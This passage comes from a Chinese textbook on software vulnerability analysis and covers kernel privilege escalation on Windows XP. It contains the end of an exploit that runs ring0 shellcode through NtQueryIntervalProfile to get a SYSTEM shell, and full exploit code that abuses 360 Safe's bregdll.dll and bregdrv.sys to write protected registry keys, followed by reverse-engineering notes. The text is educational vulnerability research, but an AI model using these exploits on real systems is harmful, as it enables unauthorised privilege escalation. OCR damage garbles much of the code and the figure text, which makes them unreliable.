B,
// Create0ptions
// EaBuffer OPTIONAL
0);
//- EaLength
printf（·\n
*NtCreateFile:");
ShowAlertMsg();
//令输出缓冲区指针指向Ha1QuerySystemInformation函数地址
*(DwORD *)g_ressdtOutputBuffer=(DwoRD)xHa1QuerySystemInformat:ion;
NtStatus = NtDeviceIoControlFile(
DeviceHandle,
// F1leHandle
---
## Page 431
412漏洞战争：软件漏洞分析精要
NULL,
// Event
NULL,
// ApcRoutine
NULL,
// ApcContext
&IoStatusBlock,
// IoStatusBlock
IOCTL_CODE,
//IoControlCode
g_InputBuffer,
// InputBuffer
4,
// InputBufferLength
g_ressdtoutputBuffer,
//OutputBuffer
4);
// OutBufferLength
printf(" * NtDeviceIoContro1File:*);
ShowAlertMsg();
Shel1CodeAddress = (PVoID)sizeof(ULoNG);
NtStatus - NtAllocateVirtualMemory(
NtCurrentProcess(),
// ProcessHandle
&Shel1CodeAddress,
// BaseAddress
θ,
//ZeroBits
&ShellCodeSize,
// AllocationSize
MEM_RESERVE |
MEM_COMMIT 1
MEM_TOP_DOWN,
//A1locationType
PAGE_EXECUTE_READwRITE); // Protect
printf(α• NtAllocateVirtualMenory:*);
ShowAlertMsg();
Rt1CopyMenory(
Shel1CodeAddress,
(PVOID)MyShe11Code,
Shel1CodeSize);
printf(* * RtIMoveMenory:");
ShowAlertMsg();
//通过调用 NtQueryInterva1Profile 函数来执行exθ上的ringθshellcode
NtStatus = NtQueryIntervalProf11e(
ProfileTotalIssues, // Source
NULL);
// Interval
printf("* NtQueryInterva1Profile:");
ShowAlertMsg();
---
## Page 432
第9章内核漏润分析
413
NtStatus = NtClose(DeviceHandle);
printf( * NtClose:");
ShowAlertMsg();
printf(**.*****..
WinExec(*cmd.exe*,SW_SHOw);
printf(**Exploit Successful!\n\n);
getchar();
return FALSE;
上面的Shellcode是针对XP的提权代码，获取KPCR地址是采用硬编码的方式，因此存在通用性
问题，关于编写通用内核Shellcode可参考发表在《Ph4nt0m》杂志上的文章《编写通用内核Shellcode》。
同时，在本章后面的分析实例中，也会对不同系统平台的内核Shellcode进行分析，这里不再具体介
绍。上述利用代码编译运行后的效果如图9-7所示，cmdexe已经获得system权限。
9.58
图9-7CMD进程获得system权限
---
## Page 433
414漏洞战争：软件漏洞分析精要
9.4360安全卫士bregdrv.sys本地提权漏洞分析
9.4.1漏洞描述
关于360安全卫士bregdrv.sys本地提权漏洞，最早于2010年2月1日被人曝光在波兰安全组织NT
Intermals的网站上，如图9-8所示。随后，瑞星在其官网发布漏润细节，并有人匿名在exploit-db上公
布利用代码（http://www.exploit-db.com/exploits/11317），然后网上就开始出现各种利用360进行提权
的利用工具，利用工具会创建出3389端口的连接后门，按5次Shif键可得到CMD权限。该提权漏洞主
要是由bregdrv.sys与bregdll.dll两个文件导致的，由于程序未对调用者进行安全检查，导致恶意程序
可通过漏洞以内核权限去读写任意注册表。
02NT140V09052009-09-02
91 51140V0813_2000-12-23
Pande Secity;SL
010022010-02-1
03.NT
0S_NT1A0V1003 2010-02-61
图9-8NTIntemals网站公告360漏洞
9.4.2基于导出函数和10控制码的追踪分析
本次漏洞分析的测试环境如表9-1所示。
表9-1测试环境
推荐使用的环境
备注
操作系统
Windows XP SP3
简体中文版
虚扣机软件
VMware Workstation
版本号：10.0.2build-1744117
漏洞软件
360安全卫士
WinDbg
版本号：6.1.6.1009
调试器
版本号：6.11.0001.404
反汇编器
IDA Pro
版本号：6.5
测试代码如下：
#include 
typedef BOOL (WINAPI *INIT_REG_ENGINE)();
---
## Page 434
第9章内核漏洞分析415
typedef LONG (WINAPI *BREG_Delete_KEY)(HKEY hKey, LPCSTR 1pSubKey);
typedef LONG (WINAPI *BREG_OPEN_KEY)(HKEY hKey, LPCSTR 1pSubKey, PHKEY phkResult);
typedef LONG (WINAPI *BREG_CLOSE_KEY)(HKEY hKey);
typedef LONG (WINAPI *REG_SET_VALUE_EX) (HKEY hKey, LPCSTR 1pValueName, DWORD Reserved, DwORD
dwType, const BYTE* 1pData, DWORD cbData);
BREG_Delete_KEY BRegDeleteKey = NULL;
BREG_OPEN_KEY BRegOpenKey = NULL;
BREG_CLOSE_KEY BRegCloseKey = NULL;
REG_SET_VALUE_EX BRegSetValueEx = NULL;
#define AppPath*Software\VM1crosoft\\Windows\\CurrentVersion\\App Paths\\36esafe,exe*
#define TestDeleteKey
HKEY_LOCAL_MACHINE
#define TestDeleteRegPath*Software\\36eSafe\\Update”
//以内核权限删除36eSafe下
的注册表项。面普通权限是无法操作的
#define TestSetKey
HKEY_LOCAL_MACHINE
#define TestSetPath
"Software\\36eSafe"
//以内核权限设置368Safe注册表项下的
键值，而普通权限是无法操作的
//获取bregd11.d11中用于操作注册表的API函数
BOOL InitBRegD11()
HKEY hKey;
LONG 1Result;
DWORD dvType;
HMODULE modBReg;
INIT_REG_ENGINE InitRegEngine;
CHAR cPath[MAX_PATH + 32]=(θ};
DWORD dwPathLen = MAX_PATH;
1Result - RegOpenKeyA(HKEY_LOCAL_MACHINE, AppPath, &hKey);
1f (FAILED(1Result))
return FALSE;
dwType = REG_SZ;
1Result = RegQueryValueExA(hKey, *Path*, NULL, &dMType, (LPBYTE)cPath, &duPathLen);
RegClosekey(hKey);
1f (FAILED(1Resu1t))
---
## Page 435
416漏洞战争：软件漏润分析精要
return FALSE;
strcat(cPath, "\\deepscan\\8REGDLL.d11");
nodBReg = LoadLibraryA(cPath);
1f (ImodBReg)
return FALSE;
InitRegEngine = (INIT_REG_ENGINE)GetProcAddress(modBReg, “InitRegEngine");
BRegOpenKey = (BREG_OPEN_KEY)GetProcAddress(modBReg,*BRegOpenKey*);
BRegSetValueEx =(REG_SET_VALUE_EX)GetProcAddress(modBReg, *BRegSetValueEx");
Iif (1InitRegEngine 111BRegDeleteKey 1I1BRegOpenKey I11BRegCloseKey 111BRegSetValueEx) {
FreeLibrary(modBReg);
return FALSE;
1f(1InitRegEngine())(
FreeLibrary(modBReg);
return FALSE;
return TRUE;
LONG TestSetRegKey()
HKEY hKey;
LONG 1Result;
static char szData[15] = “TEST VALUE°;
1Result = BRegOpenKey(TestSetKey, TestSetPath, &hKey);
1f (FAILED(1Result))
return 1Result;
dvType = REG_SZ;
1Result = BRegSetValueEx(hKey, TestSetPath, NULL, dwType, (const BYTE *)&szData,
---
## Page 436
第9章内核漏洞分析417
BRegCloseKey(hKey);
return 1Result;
int main(int argc, char *argv[])
if (1InitBRegD11())(
MessageBoxA(NULL,
“初始化BReg失败！"，“失败”，MB_ICONSTOP）；
return 1;
1f (FAILED(BRegDeleteKey(TestDeleteKey,TestDeleteRegPath)))(
return 2;
1f (FAILED(TestSetRegKey()）)（
return 3;
MessageBoxA（NULL，“突破系统安全检查，获得最高权限，漏洞利用成功1”，“成功”，MB_Ok）;
return e;
}
利用程序从bregdIL.d中获取操作注册表的导出函数InitRegEngine、BRegDeleteKey、
BRegOpenKey、BRegCloseKey和BRegSetValueEx，然后利用这些导出函数删除HKEY_LOCAL_
MACHINEISoftware\360SafelUpdate注册表项，同时在HKEY_LOCAL_MACHINEISoftware(360Safe
注册表项下，添加键名为Softwarel360Safe，键值为“TESTVALUE”的字符串值。正常情况下，普
通管理员权限是无法删除或写入上述注册表项的，如图9-9和图9-10所示。
AE
?
图9-9无法删除360Safe下的注册表项
---
## Page 437
418
漏洞战争：软件漏洞分析精要
图9-10无法在360Safe注册表项下创建值
我们将测试代码编译生成exploit.exe后，运行效果如图9-11所示，成功在HKEY_LOCAL
MACHINESoftwarel360Safe下删除和添加键值。
成功绿加键
图9-11利用代码测试成功
先看下bregdllLdll中关键的导出函数BRegSetValueEx，用IDA加载bregdlLdll，在“Export”标签
栏中找到BRegSetValueEx函数并双击进去，直接看F5代码，发现函数的返回结果是由sub_10002EF0
返回（如图9-12所示），因此可以初步断定该函数就是设置键值的关键函数。
LABLL_2%:
1f ( to8 )
 -su_188v2x，br13,a5,16,v10);// 关提函数
f （ v16 t= a6 )
ore_100CEAC(613):
50_1004061(011);
图9-12BRegSetValueEx函数
双击跟进sub_10002C80，如图9-13所示，里面只有一个关键函数sub_10003D20。
---
## Page 438
第9章内核漏润分析419
int
Int u11; // [sp*1b] [bg-h]e1
9：
图9-13sub_10002C80函数
函数sub_10003D20代码如图9-14所示，关键的处理函数是dword_1000EE88。
n
_stdcal1 sub_1el8392e(int a1, int a2, int a3, int aa, int a5, iot a6)
ist result; // eaxg1
if (result )
result - 0rd_10enct88(htoject, #, 0, 0, 4o7,a1,a2, a3, a, a5);
1F ((reso1t6 0xceeeeee8) t-BxCeeoe8ee 5)
[sn = 9e（- cone"）
1f ( a6 )
gn - 9e{+ esone°)▪
return resslt;
图9-14Sub_10003D20函数
利用IDA提供的交叉参考功能，可以发现dword_1000EE88其实是调用NtDeviceloControlFile函数
（如图9-15所示），也就是说图9-16所示的sub_10003D20函数实现1O控制码0x7BE204C的分发处理。
Sat_1eet-156r
sore_1eeeC9e d6 
sor4_1008((94 44 0
dwerd_1808(98)(_94980)
Sags 1Joet uitt
图9-15dword_1000EE88调用NtDeviceIoControlFile函数
---
## Page 439
420
漏洞战争：软件漏洞分析精要
它们是由bregdrv.sys驱动负责处理的，因此用IDA加载bregdrv.sys，从DriverEntry入口开始追踪IO
控制码分发处理函数，如图9-16所示，逐步追踪下去，直到处理10控制码0x7BE204C的调用函数。
Hrstares _stocal1 driserEntry(PseiER_oeJECT orioerob ject, PuIco_sIRint BegistryPath)
If ( 1_security_cookie 11 _security_cookie  BasBseE6at )
_security_coRie + 8bE6a;
retsra sub_18517gariserobject, RegistryPath):
PEUICE_o8JECT beice0oject; // [sp1m] [bg-i]82
1f ( reselt >* 8)
Iat w2; // eaxi1
e[sdq] [es-ds] // [e ]
//e
*_DVORO
4 - 2;
a2.
1/距进
// 1控制码，b7B2HC，负贵设置键资
If (a 1mm bregdrv
start
end